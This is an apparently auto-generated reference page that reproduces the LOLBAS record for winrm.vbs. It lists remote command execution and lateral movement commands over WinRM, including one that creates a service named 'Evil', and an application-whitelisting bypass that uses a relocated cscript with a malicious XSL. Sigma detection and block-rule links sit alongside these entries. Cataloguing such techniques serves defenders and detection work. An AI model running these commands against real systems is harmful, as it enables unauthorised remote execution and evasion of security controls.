---
parsed_by: focuslocust
source: lolbas
type: generated
---
# winrm.vbs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `winrm.vbs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Winrm.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [winrm.vbs](../../tools/windows/winrm.vbs.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | winrm.vbs |
| name | winrm.vbs |
| type | tool |
| source | lolbas |
| url | https://github.com/enigma0x3/windows-operating-system-archaeology |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@mattifestation'
  Person: Matt Graeber
- Handle: '@enigma0x3'
  Person: Matt Nelson
- Handle: '@subtee'
  Person: Casey Smith
- Handle: '@bohops'
  Person: Jimmy
- Handle: '@redcanaryco'
  Person: Red Canary Company cc Tony Lambert
Author: Oddvar Moe
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr.reg
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct
Commands:
- Category: Execute
  Command: winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
  Description: Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol
  MitreID: T1216
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  - Execute: Remote
  Usecase: Proxy execution
- Category: Execute
  Command: winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985
    && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
  Description: Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol
  MitreID: T1216
  OperatingSystem: Windows 10, Windows 11
  Privileges: Admin
  Tags:
  - Execute: CMD
  - Execute: Remote
  Usecase: Proxy execution
- Category: AWL Bypass
  Command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty'
  Description: Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl
    in the same location, and executing winrm.vbs via the relocated cscript.exe.
  MitreID: T1220
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: XSL
  Usecase: Execute arbitrary, unsigned code via XSL script
Created: 2018-05-25
Description: Script used for manage Windows RM settings
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
Full_Path:
- Path: C:\Windows\System32\winrm.vbs
- Path: C:\Windows\SysWOW64\winrm.vbs
Name: winrm.vbs
Resources:
- Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- Link: https://www.youtube.com/watch?v=3gz1QmiMhss
- Link: https://github.com/enigma0x3/windows-operating-system-archaeology
- Link: https://redcanary.com/blog/lateral-movement-winrm-wmi/
- Link: https://twitter.com/bohops/status/994405551751815170
- Link: https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
- Link: https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Winrm.yml
```

## Detection / Analysis Notes

```text
BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
```
